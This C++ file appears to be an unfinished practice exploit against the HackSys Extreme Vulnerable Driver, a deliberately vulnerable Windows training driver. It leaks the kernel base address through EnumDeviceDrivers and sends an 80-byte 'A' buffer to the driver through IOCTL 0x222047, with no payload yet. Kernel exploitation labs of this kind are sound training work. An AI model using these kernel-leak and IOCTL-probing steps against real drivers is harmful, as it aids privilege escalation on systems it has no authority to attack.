#include <iostream>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>
#include <vector>
#include <ctime>


#pragma comment (lib,"psapi")

using namespace std;
uintptr_t getKernelBase() {
    const int bufferSize = 8; // Number of drivers we want to query
    std::vector<LPVOID> baseAddresses(bufferSize); // Buffer to store driver addresses
    DWORD bytesNeeded = 0;

    // Call EnumDeviceDrivers to retrieve the addresses of loaded device drivers
    if (!EnumDeviceDrivers(baseAddresses.data(), baseAddresses.size() * sizeof(LPVOID), &bytesNeeded)) {
        std::cerr << "Failed to get kernel base address." << std::endl;
        exit(EXIT_FAILURE);
    }

    // Return the first driver's base address (assumes it's the kernel's base)
    return reinterpret_cast<uintptr_t>(baseAddresses[0]);
}

int main()
{
    uintptr_t kernelBase = getKernelBase();
    std::cout << "Kernel base address: 0x" << std::hex << kernelBase << std::endl;

    getchar();
 
   HANDLE driver_handle = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    if (driver_handle == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while opening a handle to the driver: %d\n", GetLastError());
        return 0;
    }
    printf("[+] Successfully obtained the driver handle.\n");

    ULONG ioctl = 0x222047;
    
    ULONG driver_input_buffer_length = 80;
    char exploit[80 + 8];
    printf("[*] Preparing our exploit buffer\n");
    // Fill our exploit buffer with 'A'
    memset(exploit, 0x41, 80);
  
    getchar();

    LPDWORD lpBytesReturned = 0;
    if (!DeviceIoControl(driver_handle, ioctl, exploit, driver_input_buffer_length, NULL, NULL, lpBytesReturned, NULL))
    {
        printf("[!] Error while calling DeviceIoControl\n");
    }
    
    return 0;
}